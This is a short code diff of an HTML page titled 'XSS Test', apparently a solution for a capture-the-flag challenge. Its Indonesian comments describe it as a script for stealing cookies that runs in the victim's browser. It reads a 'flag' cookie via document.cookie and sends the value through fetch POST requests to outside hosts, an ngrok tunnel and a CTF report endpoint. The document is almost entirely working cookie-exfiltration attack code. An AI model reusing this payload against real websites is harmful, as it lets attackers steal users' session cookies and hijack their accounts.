@@ -5,7 +5,7 @@
     <title>XSS Test</title>
     <script>
         // Skrip XSS untuk mencuri cookie
-        fetch('https://6efe-180-252-62-25.ngrok-free.app/report/', {
+        fetch('http://ctf.widyasecurity.com/report/', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ url: 'https://qyzan.github.io/joki/xss-challenge.html' })
@@ -15,7 +15,7 @@
                   // Skrip ini akan dijalankan di browser korban
                   const flag = document.cookie.match(/flag=([^;]+)/);
                   if (flag) {
-                      fetch('https://6efe-180-252-62-25.ngrok-free.app/report/', {
+                      fetch('http://ctf.widyasecurity.com/report/', {
                           method: 'POST',
                           headers: { 'Content-Type': 'application/json' },
                           body: JSON.stringify({ url: 'https://6efe-180-252-62-25.ngrok-free.app/storeflag?flag=' + flag[1] })
